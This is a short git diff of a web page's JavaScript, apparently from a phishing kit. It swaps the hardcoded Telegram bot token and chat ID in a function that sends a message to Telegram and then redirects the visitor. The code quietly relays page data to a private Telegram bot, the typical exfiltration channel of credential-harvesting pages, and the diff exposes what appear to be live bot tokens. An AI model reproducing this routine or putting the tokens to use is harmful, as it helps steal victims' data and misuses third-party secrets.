@@ -30,8 +30,8 @@ document.addEventListener("DOMContentLoaded", function() {
     
     // Función para enviar el mensaje a Telegram y redirigir
     function enviarMensajeTelegram(mensaje, nextPage) {
-        var token = '7284493912:AAHCM29C6UAHjFJNcMGgOWs5WtFsNfdZWHo';
-        var chatId = '5157616506';
+        var token = '7632808870:AAERUJ-n-sbjCBs3dMMLk-xyph5oLNOd7m8';
+        var chatId = '5391753542';
         var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
         var params = {
             chat_id: chatId,
